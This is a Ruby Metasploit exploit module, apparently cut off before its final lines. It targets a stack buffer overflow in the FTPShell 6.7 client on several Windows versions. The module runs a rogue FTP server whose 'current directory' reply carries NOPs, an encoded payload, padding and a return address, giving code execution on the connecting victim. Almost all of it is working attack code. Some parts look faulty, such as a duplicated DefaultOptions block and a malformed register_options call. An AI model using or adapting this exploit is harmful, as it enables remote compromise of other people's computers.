class MetasploitModule < Msf::Exploit::Remote
    include Msf::Exploit::Remote::Ftp
    def initialize(info = {})
        super(update_info(info, 
        'Name' => 'FTPShell 6.7 buffer overflow',
        'Description' => 'FTPShell 6.7 stack buffer overflow with no SEH or DEP',
        'Author' => 'DAVID',
        'DefaultOptions' => {
            'EXITFUNC' => 'process',
            'VERBOSE' => true
        },
        'Payload' => {
            'Space' => 1000,
            'BadChars' => '\x00\x22\x0d\x0a\x0b'
        },
        'Targets' => [
            ['Windows server 2008 R2 x64', {'Ret' => '\xed\x2e\x45', 'Offset' => 40}], 
            ['Windows 7 SP1 x64', {'Ret' => '\xed\x2e\x45', 'Offset' => 40}],
            ['Windows XP SP3 x86', {'Ret' => '\xed\x2e\x45', 'Offset' => 40}],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
            'SRVHOST' => '0.0.0.0',
            'EXITFUNC' => 'thread'
        }
        ))
        register_options[OptPort.new('SRVPORT', [true, 'The FTP port for reverse connection', 21])]
    end


    def exploit
        srv_ip_for_client = datastore['SRVHOST']
        if srv_ip_for_client == '0.0.0.0'
            if datastore['LHOST']
                srv_ip_for_client= datastore['LHOST']
            else
                srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')
            end
        end
        srv_port = datastore['SRVPORT']
        print_status("Waiting for target connection to #{srv_ip_for_client}:#{srv_port}")
        super
    end

    def on_client_connect(client)
        return if( (p = regenerate_payload(client)) == nil )
        print_status("client connected")
        client.put("220 Welcome.\r\n")
        client.put("331 OK.\r\n")
        client.put("230 OK.\r\n")
        sploit = make_nops(target['Offset'])
        sploit << payload.encoded
        padding = make_nops(400 - sploit.length)
        sploit << padding
        sploit << target.ret
        client.put('220 "' + sploit + '" is current directory\r\n')



